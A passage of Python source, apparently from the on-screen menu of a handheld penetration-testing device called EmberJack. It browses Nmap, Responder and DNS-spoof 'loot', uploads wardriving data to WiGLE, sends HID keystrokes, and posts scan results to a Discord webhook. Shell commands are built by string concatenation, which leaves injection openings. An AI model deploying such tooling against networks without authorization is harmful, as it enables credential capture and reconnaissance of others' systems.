                rj_theme.draw_card(draw, (x0 + pad - 2, ry0, x1 - pad + 2, ry1), fill=color.select, outline=color.accent, radius=5)
            cy = (ry0 + ry1) // 2
            lbl_x = x0 + pad + 4
            draw.text((lbl_x, cy), ch_names[ci], font=title_font if is_act else text_font, fill=ch_fills[ci], anchor="lm")
            val_x = x1 - pad - 4
            draw.text((val_x, cy), f"{desired_color[ci]:3d}", font=text_font, fill=color.selected_text if is_act else color.text, anchor="rm")
            bar_x0 = lbl_x + (18 if not _IS_COMPACT else 12)
            bar_x1 = val_x - (34 if not _IS_COMPACT else 24)
            if bar_x1 > bar_x0 + 12:
                bar_h = max(6, min(10, (ry1 - ry0) // 2))
                rj_theme.draw_progress_bar(
                    draw, (bar_x0, cy - bar_h // 2, bar_x1, cy + bar_h // 2),
                    desired_color[ci] / 255.0,
                    bg=color.well, fill=ch_fills[ci], outline=color.border_subtle, radius=3,
                )

        _draw_footer_bar(
            "L/R:Channel  U/D:±5  K1/K2:±1  Enter:Apply  Esc:Cancel" if not _IS_COMPACT else "L/R Ch U/D ±5 OK/K3",
            hex_col.upper(),
        )
        mark_display_dirty()
    finally:
        draw_lock.release()


### Screen for selecting RGB color ###
def GetColor(final_color="#E07A2F"):
    orig_color = final_color
    try:
        clean_hex = final_color.lstrip("#")
        if len(clean_hex) == 3:
            clean_hex = "".join(c * 2 for c in clean_hex)
        desired_color = [int(clean_hex[i:i + 2], 16) for i in (0, 2, 4)]
    except Exception:
        desired_color = [224, 122, 47]
    i_rgb = 0
    time.sleep(0.15)

    while True:
        _render_color_picker(desired_color, i_rgb)
        button = getButton()
        if isinstance(button, str) and button.startswith("_KB_"):
            kv = button[4:]
            if kv in ("ESCAPE", "BACKSPACE"):
                return orig_color
            elif kv == "ENTER":
                break
            continue

        if button == "KEY_LEFT_PIN":
            i_rgb = (i_rgb - 1) % 3
        elif button == "KEY_RIGHT_PIN":
            i_rgb = (i_rgb + 1) % 3
        elif button == "KEY_UP_PIN":
            desired_color[i_rgb] = (desired_color[i_rgb] + 5) % 256
        elif button == "KEY_DOWN_PIN":
            desired_color[i_rgb] = (desired_color[i_rgb] - 5) % 256
        elif button == "KEY1_PIN":
            desired_color[i_rgb] = (desired_color[i_rgb] + 1) % 256
        elif button == "KEY2_PIN":
            desired_color[i_rgb] = (desired_color[i_rgb] - 1) % 256
        elif button == "KEY3_PIN":
            return orig_color
        elif button == "KEY_PRESS_PIN":
            break

    return '#%02x%02x%02x' % (desired_color[0], desired_color[1], desired_color[2])


### Set color based on indexes ###
def SetColor(a):
    m.which = m.which + "1"
    orig = color.Get(a)
    c = GetColor(orig)
    if c.lower() != orig.lower():
        if YNDialog(a="Apply Color?", y="Apply", n="Cancel", b=c.upper()):
            color.Set(a, c)
            SaveConfig()
            Dialog("Color saved")
    m.which = m.which[:-1]


def ApplyThemePreset(preset_name: str):
    """Apply a built-in eye-friendly theme preset and persist to gui_conf.json."""
    if color.ApplyPreset(preset_name):
        SaveConfig()
        color.DrawBorder()
        Dialog(f"Theme: {preset_name}")
    else:
        Dialog("Unknown theme")


### Select a single IP octet value ###
def GetIpValue(prefix):
    value = 1
    typed = ""
    time.sleep(0.12)
    while True:
        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()
            x0, y0, x1, y1 = _modal_bounds(0.70, 0.56)
            rj_theme.draw_card(draw, (x0, y0, x1, y1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4)
            pad = 10 if not _IS_COMPACT else 4
            draw.text((x0 + pad, y0 + pad // 2), "Target IP Octet", font=title_font, fill=rj_theme.EMBER_THEME["text_bright"])

            box_y0 = y0 + _TITLE_PX + pad + 2
            box_h = max(22, _FONT_PX + 12)
            rj_theme.draw_card(draw, (x0 + pad, box_y0, x1 - pad, box_y0 + box_h), fill=color.well, outline=color.accent, radius=5)
            ip_str = f"{prefix}.{value}"
            draw.text(((x0 + x1) // 2, box_y0 + box_h // 2), ip_str, font=title_font, fill=color.selected_text, anchor="mm")

            bar_y0 = box_y0 + box_h + (10 if not _IS_COMPACT else 4)
            bar_h = max(6, min(10, (y1 - bar_y0 - pad) // 2))
            if bar_y0 + bar_h < y1 - pad:
                rj_theme.draw_progress_bar(
                    draw, (x0 + pad, bar_y0, x1 - pad, bar_y0 + bar_h),
                    value / 255.0,
                    bg=color.well, fill=color.accent, outline=color.border_subtle, radius=3,
                )

            _draw_footer_bar(
                "Type 0-255  U/D:±1  K1/K2:±5  Enter:OK" if not _IS_COMPACT else "0-255 U/D OK",
                f"{value}/255",
            )
            mark_display_dirty()
        finally:
            draw_lock.release()

        button = getButton()
        if isinstance(button, str) and button.startswith("_KB_"):
            kv = button[4:]
            if kv.isdigit():
                cand = (typed + kv)[-3:]
                if int(cand) <= 255:
                    typed = cand
                    value = int(typed)
                else:
                    typed = kv
                    value = int(typed)
            elif kv == "BACKSPACE":
                typed = typed[:-1]
                value = int(typed) if typed else 0
            elif kv in ("ENTER", "ESCAPE"):
                break
        elif button == "KEY_UP_PIN":
            typed = ""
            value = min(255, value + 1)
        elif button == "KEY_DOWN_PIN":
            typed = ""
            value = max(0, value - 1)
        elif button == "KEY1_PIN":
            typed = ""
            value = min(255, value + 5)
        elif button == "KEY2_PIN":
            typed = ""
            value = max(0, value - 5)
        elif button in ("KEY_PRESS_PIN", "KEY3_PIN"):
            break

    return value


### Gamepad ###
def Gamepad():
    m.which = m.which + "1"
    time.sleep(0.25)
    try:
        rj_input.flush()
    except Exception:
        pass
    last_states = None
    while True:
        vbtn = None
        try:
            vbtn = rj_input.get_virtual_button()
        except Exception:
            vbtn = None
        if vbtn in ("KEY_PRESS_PIN", "KEY3_PIN") or GPIO.input(PINS["KEY_PRESS_PIN"]) == 0:
            break

        states = (
            GPIO.input(PINS["KEY_UP_PIN"]) == 0 or vbtn == "KEY_UP_PIN",
            GPIO.input(PINS["KEY_LEFT_PIN"]) == 0 or vbtn == "KEY_LEFT_PIN",
            GPIO.input(PINS["KEY_RIGHT_PIN"]) == 0 or vbtn == "KEY_RIGHT_PIN",
            GPIO.input(PINS["KEY_DOWN_PIN"]) == 0 or vbtn == "KEY_DOWN_PIN",
            GPIO.input(PINS["KEY1_PIN"]) == 0 or vbtn == "KEY1_PIN",
            GPIO.input(PINS["KEY2_PIN"]) == 0 or vbtn == "KEY2_PIN",
            GPIO.input(PINS["KEY3_PIN"]) == 0,
        )
        if states != last_states:
            last_states = states
            try:
                draw_lock.acquire()
                _draw_toolbar()
                color.DrawMenuBackground()
                x0, y0, x1, y1 = _modal_bounds(0.78, 0.78)
                rj_theme.draw_card(draw, (x0, y0, x1, y1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4)
                pad = 8 if not _IS_COMPACT else 3
                draw.text((x0 + pad, y0 + pad // 2), "HID Gamepad", font=title_font, fill=rj_theme.EMBER_THEME["text_bright"])

                cx_left = x0 + (x1 - x0) // 3
                cy = (y0 + _TITLE_PX + pad + y1) // 2
                unit = max(12, min(28, (y1 - y0) // 6))

                rj_theme.draw_card(draw, (cx_left - unit // 2, cy - unit // 2, cx_left + unit // 2, cy + unit // 2), fill=color.well, outline=color.gamepad, radius=4)
                d_polys = [
                    [(cx_left - unit // 2, cy - unit // 2 - 3), (cx_left, cy - unit - unit // 2), (cx_left + unit // 2, cy - unit // 2 - 3)],
                    [(cx_left - unit - unit // 2, cy), (cx_left - unit // 2 - 3, cy - unit // 2), (cx_left - unit // 2 - 3, cy + unit // 2)],
                    [(cx_left + unit + unit // 2, cy), (cx_left + unit // 2 + 3, cy - unit // 2), (cx_left + unit // 2 + 3, cy + unit // 2)],
                    [(cx_left, cy + unit + unit // 2), (cx_left + unit // 2, cy + unit // 2 + 3), (cx_left - unit // 2, cy + unit // 2 + 3)],
                ]
                for idx_p, poly in enumerate(d_polys):
                    draw.polygon(poly, outline=color.gamepad, fill=color.gamepad_fill if states[idx_p] else color.well)

                cx_right = x0 + int((x1 - x0) * 0.72)
                r_btn = max(8, int(unit * 0.65))
                btn_pos = [
                    (cx_right, cy - r_btn - 6, "Q", states[4]),
                    (cx_right + r_btn + 8, cy, "E", states[5]),
                    (cx_right, cy + r_btn + 6, "R", states[6]),
                ]
                for bx, by, blbl, active in btn_pos:
                    draw.ellipse((bx - r_btn, by - r_btn, bx + r_btn, by + r_btn), outline=color.gamepad, fill=color.gamepad_fill if active else color.well, width=2)
                    draw.text((bx, by), blbl, font=small_font, fill=rj_theme.EMBER_THEME["text_on_accent"] if active else color.text, anchor="mm")

                _draw_footer_bar("Arrows/K1-K3:Send HID  Enter/Esc:Exit" if not _IS_COMPACT else "OK/Esc:Exit", "HID")
                mark_display_dirty()
            finally:
                draw_lock.release()

        keys = []
        for idx_k, name in enumerate(("UP", "LEFT", "RIGHT", "DOWN", "Q", "E", "R")):
            if states[idx_k]:
                keys.append(name)
        if keys:
            render_chars = "".join(f'press("{k}");' for k in keys)
            print(os.popen("P4wnP1_cli hid job -t 5 -c '" + render_chars + "'").read())
            time.sleep(0.20)
        else:
            time.sleep(0.04)
    m.which = m.which[:-1]
    time.sleep(0.15)

### Basic info screen ###
def _get_operstate(interface):
    try:
        with open(f"/sys/class/net/{interface}/operstate", "r") as f:
            return f.read().strip()
    except Exception:
        return None

def _get_interface_ipv4(interface):
    try:
        cfg = netifaces.ifaddresses(interface)
        ipv4_list = cfg.get(netifaces.AF_INET, [])
        if not ipv4_list:
            return None, None
        return ipv4_list[0].get("addr"), ipv4_list[0].get("netmask")
    except Exception:
        return None, None

def _get_routed_info():
    try:
        out = subprocess.check_output("ip route get 1.1.1.1", shell=True).decode().strip()
        parts = out.split()
        iface = None
        gw = None
        if "dev" in parts:
            iface = parts[parts.index("dev") + 1]
        if "via" in parts:
            gw = parts[parts.index("via") + 1]
        return iface, gw
    except Exception:
        return None, None

def _get_interface_candidates(preferred, routed):
    candidates = []
    for name in [preferred, routed, "eth0", "eth1", "wlan0", "wlan1"]:
        if name and name not in candidates:
            candidates.append(name)
    try:
        for name in netifaces.interfaces():
            if name not in candidates:
                candidates.append(name)
    except Exception:
        pass
    return candidates

def _list_eth_wlan_interfaces(preferred=None, routed=None):
    names = []
    for name in [preferred, routed]:
        if name:
            names.append(name)
    try:
        names.extend(netifaces.interfaces())
    except Exception:
        pass
    ordered = []
    for name in names:
        if name and name.startswith(("eth", "enp", "eno", "ens", "wlan", "wlp", "wlo", "wlx")) and name not in ordered:
            ordered.append(name)
    infos = []
    for name in ordered:
        ip, mask = _get_interface_ipv4(name)
        infos.append({"name": name, "ip": ip, "mask": mask, "oper": _get_operstate(name)})
    return infos

def _choose_interface_for_action(preferred=None):
    routed_iface, _ = _get_routed_info()
    interfaces = _list_eth_wlan_interfaces(preferred, routed_iface)
    if len(interfaces) <= 1:
        if interfaces:
            return interfaces[0]["name"]
        return preferred or routed_iface or "eth0"

    labels = [f" Auto (routed: {routed_iface or 'none'})"]
    for info in interfaces:
        ip = info["ip"] or "no ip"
        labels.append(f" {info['name']} ({ip})")

    idx, _ = GetMenuString(labels, duplicates=True)
    if idx == -1:
        return "__back__"
    if idx == 0:
        if routed_iface:
            for info in interfaces:
                if info["name"] == routed_iface and info["ip"]:
                    return routed_iface
        for info in interfaces:
            if info["ip"]:
                return info["name"]
        return preferred or interfaces[0]["name"]
    return interfaces[idx - 1]["name"]

def _select_interface_menu(active_ifaces, routed_iface):
    if len(active_ifaces) <= 1:
        return active_ifaces[0]["name"] if active_ifaces else None
    labels = [f" Auto (routed: {routed_iface or 'none'})"]
    for info in active_ifaces:
        labels.append(f" {info['name']} ({info['ip']})")
    idx, _ = GetMenuString(labels, duplicates=True)
    if idx == -1:
        return "__back__"
    if idx == 0:
        return None
    return active_ifaces[idx - 1]["name"]

def _build_network_info_lines(selected_iface=None, preferred=None):
    routed_iface, routed_gw = _get_routed_info()
    candidates = _get_interface_candidates(preferred, routed_iface)
    active_ifaces = []
    for name in candidates:
        ip, mask = _get_interface_ipv4(name)
        if ip:
            active_ifaces.append({"name": name, "ip": ip, "mask": mask})

    # Choose interface
    if selected_iface:
        interface = selected_iface
    else:
        interface = routed_iface or (active_ifaces[0]["name"] if active_ifaces else (preferred or "eth0"))

    interface_ipv4, interface_subnet_mask = _get_interface_ipv4(interface)
    operstate = _get_operstate(interface)
    try:
        output = subprocess.check_output(
            f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'",
            shell=True
        )
        address = output.decode().strip().split('\\')[0]
    except Exception:
        address = ""

    interface_gateway = netifaces.gateways().get("default", {}).get(netifaces.AF_INET, [None])[0]
    interface_gateway = routed_gw or interface_gateway

    info_lines = [
        f"Interface: {interface}",
        f"Routed: {routed_iface or 'None'}",
    ]

    if interface_ipv4:
        info_lines.extend([
            f"IP: {interface_ipv4}",
            f"Subnet: {interface_subnet_mask}",
            "Gateway:",
            f"  {interface_gateway or 'None'}",
            "Attack:",
            f"  {address or 'N/A'}",
        ])
        if interface.startswith('wlan') and WIFI_AVAILABLE:
            try:
                from wifi.wifi_manager import wifi_manager
                status = wifi_manager.get_connection_status(interface)
                if status.get("ssid"):
                    info_lines.extend([
                        "SSID:",
                        f"  {status['ssid']}"
                    ])
            except Exception:
                pass
    else:
        info_lines.extend([
            "Status: No IPv4",
            "Check connection",
        ])

    if operstate and operstate != "up":
        if interface.startswith("wlan"):
            info_lines.append("WiFi: down")
        elif interface.startswith("eth"):
            info_lines.append("Cable: down")
        else:
            info_lines.append(f"Link: {operstate}")

    return info_lines, active_ifaces, routed_iface

def ShowInfo():
    """Display network information using scrollable text view."""
    try:
        preferred = get_best_interface_prefer_eth()
        info_lines, active_ifaces, routed_iface = _build_network_info_lines(None, preferred)
        chosen = _select_interface_menu(active_ifaces, routed_iface)
        if chosen == "__back__":
            return
        selected_iface = chosen

        def _refresh():
            lines, _, _ = _build_network_info_lines(selected_iface, preferred)
            return lines

        DisplayScrollableInfo(info_lines, refresh_fn=_refresh, refresh_interval=2.0)
    except (KeyError, IndexError, ValueError, OSError) as e:
        info_lines = [
            "Network Error",
            f"Details: {str(e)[:15]}...",
            "Check ethernet cable",
            "or use WiFi Manager"
        ]
        DisplayScrollableInfo(info_lines)


def DisplayScrollableInfo(info_lines, refresh_fn=None, refresh_interval=2.0):
    """Display scrollable text information in an Obsidian Ember card with key/value styling."""
    pad = _UI_PAD
    card_x0 = pad
    card_y0 = _CONTENT_Y0 + 2
    card_x1 = _SCR_W - pad
    card_y1 = _CONTENT_Y1 - 2
    sb_w = 5 if not _IS_COMPACT else 3
    row_h = max(14, _FONT_PX + (6 if not _IS_COMPACT else 3))
    WINDOW = max(4, (card_y1 - card_y0 - 8) // row_h)
    max_width = max(40, (card_x1 - card_x0) - sb_w - 18)

    def _build_display_lines(lines):
        display = []
        for line in lines:
            wrapped = _wrap_text_to_width(line, max_width, text_font)
            display.extend(wrapped if wrapped else [""])
        return display or [""]

    if refresh_fn:
        info_lines = refresh_fn() or info_lines
    display_lines = _build_display_lines(info_lines)
    total = len(display_lines)
    index = 0
    offset = 0
    last_refresh = time.time()

    while True:
        if refresh_fn and (time.time() - last_refresh) >= refresh_interval:
            new_lines = refresh_fn()
            if new_lines:
                info_lines = new_lines
                display_lines = _build_display_lines(info_lines)
                total = len(display_lines)
                index = min(index, total - 1)
                offset = 0 if total <= WINDOW else min(offset, total - WINDOW)
            last_refresh = time.time()

        if index < offset:
            offset = index
        elif index >= offset + WINDOW:
            offset = index - WINDOW + 1

        window = display_lines[offset:offset + WINDOW]
        has_sb = total > WINDOW

        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()
            rj_theme.draw_card(draw, (card_x0, card_y0, card_x1, card_y1), fill=color.surface, outline=color.border_subtle, radius=7 if not _IS_COMPACT else 3)

            inner_x0 = card_x0 + 6
            inner_x1 = card_x1 - (sb_w + 6 if has_sb else 6)
            for i, line in enumerate(window):
                ry0 = card_y0 + 4 + i * row_h
                ry1 = min(card_y1 - 3, ry0 + row_h - 1)
                is_sel = (i == (index - offset))

                if is_sel:
                    rj_theme.draw_card(draw, (inner_x0 - 2, ry0, inner_x1, ry1), fill=color.select, outline=color.border_subtle, radius=4, accent_left=color.accent, accent_width=2)
                elif (offset + i) % 2 == 1 and not _IS_COMPACT:
                    draw.rectangle((inner_x0 - 2, ry0, inner_x1, ry1), fill=color.well)

                tx = inner_x0 + 4
                ty = ry0 + max(1, (ry1 - ry0 - _FONT_PX) // 2)
                stripped = line.strip()
                if stripped.startswith("===") or (stripped.endswith(":") and len(stripped) < 28):
                    draw.text((tx, ty), line, font=title_font if not _IS_COMPACT else text_font, fill=color.accent)
                elif ":" in line and not line.startswith(" "):
                    k_part, v_part = line.split(":", 1)
                    k_txt = k_part + ":"
                    draw.text((tx, ty), k_txt, font=text_font, fill=color.text_muted if not is_sel else color.selected_text)
                    kw = int(draw.textlength(k_txt, font=text_font)) + 2
                    draw.text((tx + kw, ty), v_part, font=text_font, fill=rj_theme.EMBER_THEME["text_bright"] if is_sel else color.text)
                else:
                    draw.text((tx, ty), line, font=text_font, fill=color.selected_text if is_sel else color.text)

            if has_sb:
                rj_theme.draw_scrollbar(draw, card_x1 - sb_w - 3, card_y0 + 5, card_y1 - 5, offset, WINDOW, total, width=sb_w, track_color=color.well, thumb_color=color.accent)

            _draw_footer_bar(
                "Up/Dn:Scroll  PgUp/Dn:Jump  Esc/Left:Back" if not _IS_COMPACT else "U/D Scroll K3:Bk",
                f"{index + 1}/{max(1, total)}",
            )
            mark_display_dirty()
        finally:
            draw_lock.release()

        time.sleep(0.06)

        btn = getButton()
        if isinstance(btn, str) and btn.startswith("_KB_"):
            kv = btn[4:]
            if kv == "PAGEUP":
                index = max(0, index - WINDOW)
            elif kv == "PAGEDOWN":
                index = min(total - 1, index + WINDOW)
            elif kv == "HOME":
                index = 0
            elif kv == "END":
                index = max(0, total - 1)
            elif kv in ("ESCAPE", "BACKSPACE"):
                return
        elif btn == "KEY_DOWN_PIN":
            index = (index + 1) % total
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total
        elif btn in ("KEY_LEFT_PIN", "KEY3_PIN"):
            return


def ShowDiscordInfo():
    """Display Discord webhook status in a dedicated screen."""
    try:
        webhook_url = get_discord_webhook()
        if webhook_url:
            short = webhook_url[:32] + "..." if len(webhook_url) > 32 else webhook_url
            info_lines = [
                "Discord:",
                "Webhook configured",
                "URL:",
                f"  {short}",
            ]
        else:
            info_lines = [
                "Discord:",
                "No webhook set",
                "Configure in options",
            ]
    except Exception as e:
        info_lines = [
            "Discord Error",
            f"{str(e)[:20]}",
        ]
    DisplayScrollableInfo(info_lines)


def Explorer(path="/",extensions=""):
    # ".gif\|.png\|.bmp\|.jpg\|.tiff\|.jpeg"
    while 1:
        arr = ["../"] + os.popen("ls --format=single-column -F " + path + (" | grep \"" + extensions + "\\|/\"","")[extensions==""] ).read().replace("*","").split("\n")[:-1]
        output = GetMenuString(arr,False)
        if output != "":
            if output == "../":
                if path == "/":
                    break
                else:
                    path = (path,path[:-1])[path[-1] == "/"]
                    path = path[:path.rindex("/")]
                    if path == "":
                        path = "/"
                    else:
                        path = (path + "/",path)[path[-1] == "/"]
            elif output[-1] == "/":
                path = (path + "/",path)[path[-1] == "/"]
                path = path + output
                path = (path + "/",path)[path[-1] == "/"]
            else:
                if YNDialog("Open?","Yes","No",output[:10]):
                    return path + output
        else:
            break
    return ""

def _display_text_file(rfile: str, category: str) -> None:
    """Display a loot/log text file in the Obsidian Ember scrollable reader."""
    fname = os.path.basename(rfile)
    max_bytes = 1024 * 1024  # 1 MiB safety cap for large logs or binary captures
    try:
        size_bytes = os.path.getsize(rfile)
        size_str = f"{size_bytes / 1024:.1f} KB" if size_bytes >= 1024 else f"{size_bytes} B"
    except OSError:
        size_str = "?"
    header_lines = [
        f"=== {category} ===",
        f"File: {fname}",
        f"Size: {size_str}",
        "",
    ]
    try:
        with open(rfile, "r", encoding="utf-8", errors="replace") as f:
            raw = f.read(max_bytes + 1)
    except OSError as exc:
        DisplayScrollableInfo(header_lines + [f"Error reading file: {exc}"])
        return
    truncated = len(raw) > max_bytes
    if truncated:
        raw = raw[:max_bytes]
    content = [ln.replace("\x00", "").expandtabs(2) for ln in raw.splitlines()]
    if not content:
        content = ["(Empty file)"]
    elif truncated:
        content.append("")
        content.append("... (truncated at 1 MB; view full file in WebUI)")
    DisplayScrollableInfo(header_lines + content)


def ReadTextFileNmap():
    while 1:
        rfile = Explorer(os.path.join(default.install_path, "loot/Nmap/"),extensions=".txt\\|.json\\|.conf\\|.pcap")
        if rfile == "":
            break
        _display_text_file(rfile, "Nmap Loot")

def ReadTextFileResponder():
    while 1:
        rfile = Explorer(os.path.join(default.install_path, "Responder/logs/"),extensions=".log\\|.txt\\|.pcap")
        if rfile == "":
            break
        _display_text_file(rfile, "Responder Log")

def ReadTextFileDNSSpoof():
    while 1:
        rfile = Explorer(os.path.join(default.install_path, "DNSSpoof/captures/"),extensions=".log\\|.txt\\|.pcap")
        if rfile == "":
            break
        _display_text_file(rfile, "DNS Spoof Log")

def _list_wardriving_files(directory: str) -> list[str]:
    try:
        files = []
        for name in os.listdir(directory):
            path = os.path.join(directory, name)
            if not os.path.isfile(path):
                continue
            lower_name = name.lower()
            if not lower_name.endswith(".csv"):
                continue
            if "wigle" not in lower_name:
                continue
            files.append(name)
        return sorted(
            files,
            key=lambda filename: os.path.getmtime(os.path.join(directory, filename)),
            reverse=True,
        )
    except Exception:
        return []


def _rename_uploaded_wigle_file(file_path: str) -> str:
    directory = os.path.dirname(file_path)
    filename = os.path.basename(file_path)
    if filename.startswith("[uploaded]"):
        return file_path

    target_name = f"[uploaded]{filename}"
    target_path = os.path.join(directory, target_name)
    if not os.path.exists(target_path):
        os.replace(file_path, target_path)
        return target_path

    stem, ext = os.path.splitext(filename)
    suffix = 2
    while True:
        candidate_name = f"[uploaded]{stem}_{suffix}{ext}"
        candidate_path = os.path.join(directory, candidate_name)
        if not os.path.exists(candidate_path):
            os.replace(file_path, candidate_path)
            return candidate_path
        suffix += 1

def ReadTextFileWardriving():
    directory = os.path.join(default.install_path, "loot/wardriving/")
    while 1:
        files = _list_wardriving_files(directory)
        selection_index, selection = GetMenuString([f" {name}" for name in files], duplicates=True)
        if selection_index == -1:
            break
        if selection_index == -2:
            Dialog_info("No WiGLE files", wait=False, timeout=1.0)
            continue
        rfile = os.path.join(directory, selection.strip())
        action_index, _action = GetMenuString([
            " Upload to WiGLE",
            " View file",
        ], duplicates=True)
        if action_index == -1:
            continue
        if action_index == 0:
            result = upload_wigle_file_with_dialog(rfile)
            if result.get("ok"):
                try:
                    _rename_uploaded_wigle_file(rfile)
                except Exception as exc:
                    print(f"Failed to rename uploaded WiGLE file: {exc}")
            continue
        _display_text_file(rfile, "Wardriving WiGLE")

def ImageExplorer() -> None:
    m.which += "1"
    path = default.imgstart_path
    _IMG_EXTS = (".gif", ".png", ".bmp", ".jpg", ".tiff", ".jpeg")
    while True:
        entries = []
        try:
            with os.scandir(path) as it:
                for ent in it:
                    name = ent.name
                    if name.startswith("."):
                        continue
                    try:
                        if ent.is_dir():
                            entries.append(name + "/")
                        elif name.lower().endswith(_IMG_EXTS):
                            entries.append(name)
                    except OSError:
                        pass
            entries.sort(key=lambda s: (not s.endswith("/"), s.lower()))
        except OSError:
            pass
        arr = ["./"] + entries

        output = GetMenuString(arr, False)
        if not output:
            break

        # ───── navigation ─────
        if output == "./":                       # remonter
            if path == "/":
                break
            path = path.rstrip("/")
            path = path[:path.rindex("/")] or "/"
            if not path.endswith("/"):
                path += "/"
        elif output.endswith("/"):               # entrer dans un dossier
            if not path.endswith("/"):
                path += "/"
            path += output
            if not path.endswith("/"):
                path += "/"
        else:                                    # prévisualiser un fichier image
            if YNDialog("Open Image?", "View", "Cancel", output[:18]):
                full_img = os.path.join(path, output)
                try:
                    with Image.open(full_img) as img:
                        avail_w = max(32, _SCR_W - 8)
                        avail_h = max(32, _SCR_H - _FOOTER_H - 8)
                        fitted = ImageOps.contain(img.convert("RGB"), (avail_w, avail_h))
                        try:
                            draw_lock.acquire()
                            draw.rectangle((0, 0, _SCR_W, _SCR_H), fill=color.background)
                            px = (_SCR_W - fitted.width) // 2
                            py = max(4, (_SCR_H - _FOOTER_H - fitted.height) // 2)
                            image.paste(fitted, (px, py))
                            _draw_footer_bar(f"{output}  |  Any key to return", f"{img.width}x{img.height}")
                            mark_display_dirty()
                        finally:
                            draw_lock.release()
                    time.sleep(0.35)
                    getButton()
                except Exception as exc:
                    Dialog_info(f"Cannot open image:\n{exc}", wait=True)
                color.DrawBorder()
    m.which = m.which[:-1]





WAIT_TXT = "Scan in progess..."
WIGLE_UPLOAD_URL = "https://api.wigle.net/api/v2/file/upload"

def get_discord_webhook():
    """Read Discord webhook URL from configuration file."""
    webhook_file = os.path.join(default.install_path, "discord_webhook.txt")
    try:
        if os.path.exists(webhook_file):
            with open(webhook_file, 'r') as f:
                webhook_url = f.read().strip()
                if webhook_url and webhook_url.startswith("https://discord.com/api/webhooks/"):
                    return webhook_url
    except Exception as e:
        print(f"Error reading Discord webhook: {e}")
    return None


def get_wigle_credentials():
    credentials_file = os.path.join(default.install_path, ".wigle_credentials.json")
    try:
        if not os.path.exists(credentials_file):
            return "", ""
        with open(credentials_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict):
            return "", ""
        api_name = str(data.get("api_name") or "").strip()
        api_token = str(data.get("api_token") or "").strip()
        return api_name, api_token
    except Exception as e:
        print(f"Error reading WiGLE credentials: {e}")
        return "", ""


def upload_wigle_file(file_path: str) -> dict:
    api_name, api_token = get_wigle_credentials()
    if not api_name or not api_token:
        return {"ok": False, "message": "Missing WiGLE\ncredentials"}
    if not os.path.exists(file_path):
        return {"ok": False, "message": "File not found"}

    try:
        file_size = os.path.getsize(file_path)
    except OSError:
        return {"ok": False, "message": "File unreadable"}

    if file_size <= 0:
        return {"ok": False, "message": "Empty file"}
    if file_size > 180 * 1024 * 1024:
        return {"ok": False, "message": "File exceeds\nWiGLE limit"}

    import requests
    try:
        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f, 'text/csv')
            }
            response = requests.post(
                WIGLE_UPLOAD_URL,
                files=files,
                auth=(api_name, api_token),
                timeout=60,
            )
    except requests.exceptions.Timeout:
        return {"ok": False, "message": "Upload timeout"}
    except requests.exceptions.ConnectionError:
        return {"ok": False, "message": "Network error"}
    except requests.exceptions.RequestException as e:
        print(f"WiGLE upload request error: {e}")
        return {"ok": False, "message": "Upload failed"}

    if response.status_code == 401:
        return {"ok": False, "message": "WiGLE auth\nfailed"}
    if response.status_code != 200:
        return {"ok": False, "message": f"Upload error\nHTTP {response.status_code}"}

    try:
        data = response.json()
    except ValueError:
        return {"ok": False, "message": "Bad WiGLE\nresponse"}

    if not data.get("success"):
        warning = str(data.get("warning") or "").strip()
        message = warning or str(data.get("message") or "Upload rejected").strip()
        return {"ok": False, "message": message[:42] or "Upload rejected"}

    results = data.get("results") or {}
    transids = results.get("transids") or []
    transid = ""
    if isinstance(transids, list) and transids:
        transid = str((transids[0] or {}).get("transId") or "").strip()
    observer = str(data.get("observer") or "").strip()
    message = "Upload OK"
    if transid:
        message += f"\n{transid}"
    elif observer:
        message += f"\n{observer[:16]}"
    return {
        "ok": True,
        "message": message,
        "transid": transid,
        "observer": observer,
    }


def upload_wigle_file_with_dialog(file_path: str) -> dict:
    result_box = {"result": None}

    def _worker():
        result_box["result"] = upload_wigle_file(file_path)

    thread = threading.Thread(target=_worker, daemon=True)
    thread.start()

    dots = 0
    while thread.is_alive():
        dots = (dots + 1) % 4
        suffix = "." * dots if dots else "."
        Dialog_info(f"Uploading to\nWiGLE{suffix}\nPlease wait", wait=False)
        time.sleep(0.25)

    thread.join()
    result = result_box.get("result") or {"ok": False, "message": "Upload failed"}
    _wait_for_button_release(0.75)
    if result.get("ok"):
        detail = result.get("transid") or result.get("observer") or "Upload accepted"
        Dialog_result("WiGLE Accepted", detail, wait=True)
    else:
        detail = result.get("message") or "Upload failed"
        Dialog_result("WiGLE Failed", detail, wait=True)
    return result

def send_to_discord(scan_label: str, file_path: str, target_network: str, interface: str):
    """Send Nmap scan results as a file attachment to Discord webhook."""
    webhook_url = get_discord_webhook()
    if not webhook_url:
        print("Discord webhook not configured - skipping webhook notification")
        return

    try:
        # Check if file exists and get its size
        if not os.path.exists(file_path):
            print(f"Scan file not found: {file_path}")
            return

        file_size = os.path.getsize(file_path)
        if file_size == 0:
            print("Scan file is empty")
            return

        # Create Discord embed with file info
        embed = {
            "title": f"🔍 Nmap Scan Complete: {scan_label}",
            "description": f"**Target Network:** `{target_network}`\n**Interface:** `{interface}`\n**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "color": 0x00ff00,  # Green color
            "fields": [
                {
                    "name": "📁 Scan Results",
                    "value": f"**File:** `{os.path.basename(file_path)}`\n**Size:** {file_size:,} bytes\n**Download the file below for complete results**",
                    "inline": False
                }
            ],
            "footer": {
                "text": "EmberJack Nmap Scanner"
            },
            "timestamp": datetime.now().isoformat()
        }

        # Prepare the payload with file
        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f, 'text/plain')
            }

            payload = {
                'payload_json': json.dumps({'embeds': [embed]})
            }

            # Send to Discord with file attachment
            import requests
            response = requests.post(webhook_url, data=payload, files=files, timeout=30)

        if response.status_code == 204:
            print("✅ Discord webhook with file sent successfully")
        else:
            print(f"❌ Discord webhook failed: {response.status_code}")

    except Exception as e:
        print(f"❌ Error sending Discord webhook with file: {e}")

def run_scan(label: str, nmap_args: list[str]):
    # Get target network from best available interface
    interface = _choose_interface_for_action(get_best_interface_prefer_eth())
